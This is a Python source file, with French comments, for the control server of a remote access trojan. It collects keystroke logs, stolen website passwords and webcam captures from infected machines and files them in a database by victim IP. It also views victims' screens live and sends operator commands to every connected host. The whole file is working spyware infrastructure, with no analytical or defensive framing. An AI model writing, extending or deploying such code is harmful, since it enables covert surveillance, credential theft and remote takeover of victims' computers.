import socket
import threading
import sqlite3
from datetime import datetime
import os
import json
import struct
import pickle
from PIL import Image
import io
import cv2
import numpy as np
import time


SERVER_HOST = '0.0.0.0'
SERVER_PORT = 4444
DB_PATH = "../bdd/rat.db"
KEYLOG_DIR = "keylogs"
CAPTURE_DIR = "captures"


REMOTE_PORT = 5555


def remote_view():
    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.bind((SERVER_HOST, REMOTE_PORT))
    remote_socket.listen(1)
    print("[*] Remote stream en attente de connexion...")

    conn, addr = remote_socket.accept()
    print(f"[+] Remote stream connecté : {addr}")

    try:
        while True:
            raw_size = conn.recv(4)
            if not raw_size:
                break
            size = struct.unpack("!I", raw_size)[0]
            data = b""
            while len(data) < size:
                packet = conn.recv(size - len(data))
                if not packet:
                    break
                data += packet
            frame_data = pickle.loads(data)
            width, height = frame_data['size']
            rgb = frame_data['rgb']
            frame_np = np.frombuffer(rgb, dtype=np.uint8).reshape((height, width, 3))
            cv2.imshow("REMOTE ACCESS LIVE", frame_np)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
    except Exception as e:
        print(f"[!] Remote error: {e}")
    finally:
        conn.close()
        remote_socket.close()
        cv2.destroyAllWindows()

# Création des dossiers nécessaires
os.makedirs(KEYLOG_DIR, exist_ok=True)
os.makedirs(CAPTURE_DIR, exist_ok=True)

# Connexion à la base de données
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

clients = {}

def save_to_db(file_type, client_ip, data, file_path=None):
    """Sauvegarde des données dans la base de données."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if file_type == "keystroke":
        cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)", (timestamp, client_ip, data))
    elif file_type == "passwords":
        for pwd in data:
            cursor.execute("INSERT INTO passwords (target_ip, timestamp, url, username, password) VALUES (?, ?, ?, ?, ?)",
                           (client_ip, timestamp, pwd['url'], pwd['username'], pwd['password']))
    elif file_type == "webcam_capture":
        cursor.execute("INSERT INTO webcam (timestamp, target_ip, file_path) VALUES (?, ?, ?)", (timestamp, client_ip, file_path))
    conn.commit()

def process_data(data, client_ip):
    """Traitement des données reçues du client."""
    try:
        parsed_data = json.loads(data)
        file_type = parsed_data.get("type")
        file_data = parsed_data.get("data")
        filename = parsed_data.get("filename", "")

        if file_type == "keystroke":
            file_path = os.path.join(KEYLOG_DIR, filename)
            with open(file_path, "wb") as f:
                f.write(bytes.fromhex(file_data))
            save_to_db(file_type, client_ip, file_data, file_path)

        elif file_type == "passwords":
            save_to_db(file_type, client_ip, file_data)

        elif file_type == "webcam_capture":
            file_path = os.path.join(CAPTURE_DIR, filename)
            with open(file_path, "wb") as f:
                f.write(bytes.fromhex(file_data))
            save_to_db(file_type, client_ip, file_data, file_path)

        print(f"[+] Données '{file_type}' reçues et sauvegardées de {client_ip}")

    except Exception as e:
        print(f"[Erreur] lors du traitement des données : {e}")

def handle_client(client_socket, client_address):
    """Gestion des connexions clients."""
    print(f"[+] Connexion de {client_address}")
    clients[client_address] = client_socket

    while True:
        try:
            data = client_socket.recv(1048576).decode('utf-8')
            if data:
                process_data(data, client_address[0])
        except:
            break
    client_socket.close()

    del clients[client_address]
    print(f"[-] Déconnexion de {client_address}")

def accept_connections():
    """Accepter les connexions entrantes."""
    while True:
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)
print(f"[*] Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}...")


threading.Thread(target=accept_connections, daemon=True).start()

try:
    while True:
        command = input("Admin > ").strip()
        if command == "exit":
            break

        elif command == "remote":
            threading.Thread(target=remote_view, daemon=True).start()
            time.sleep(1.5)  # Attendre lecoute du port 5555
            for client in clients.values():
                client.send(command.encode('utf-8'))

        elif command:
            for client in clients.values():
                client.send(command.encode('utf-8'))
except KeyboardInterrupt:
    print("\n[!] Arrêt du serveur par l'utilisateur.")
finally:
    server_socket.close()
    conn.close()
    print("[*] Serveur arrêté proprement.")

